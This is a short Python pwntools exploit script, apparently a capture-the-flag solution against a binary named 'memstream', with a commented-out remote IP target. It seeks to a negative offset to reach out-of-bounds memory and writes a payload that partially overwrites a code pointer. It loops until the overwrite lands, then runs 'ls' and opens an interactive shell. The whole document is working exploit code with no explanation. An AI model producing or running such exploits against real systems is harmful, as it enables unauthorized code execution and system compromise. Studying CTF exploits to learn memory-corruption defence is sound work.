#!/usr/bin/env python3

# type: ignore
# flake8: noqa

from pwn import *


def seek(p, offset):
    p.sendline(b"1")
    p.sendlineafter(b"Position:", str(offset).encode())


def write(p, data):
    p.sendline(b"3")
    p.sendlineafter(b"Size:", str(len(data)).encode())
    p.sendafter(b"Data:", data)


if __name__ == "__main__":
    while True:
        p = process("./memstream")
        # p = remote("54.78.163.105", 30497)

        # input("attach debugger")

        offset = -28768

        # offset = -728
        offset += 0x1378

        seek(p, offset)

        payload = b"A" * 8
        payload += p64(0x1229)
        payload += p16(0x3378)
        write(p, payload)

        try:
            p.sendlineafter(b"> ", b"4")
            p.sendline(b"ls")
            p.recvline()
            p.interactive()
        except EOFError:
            p.close()
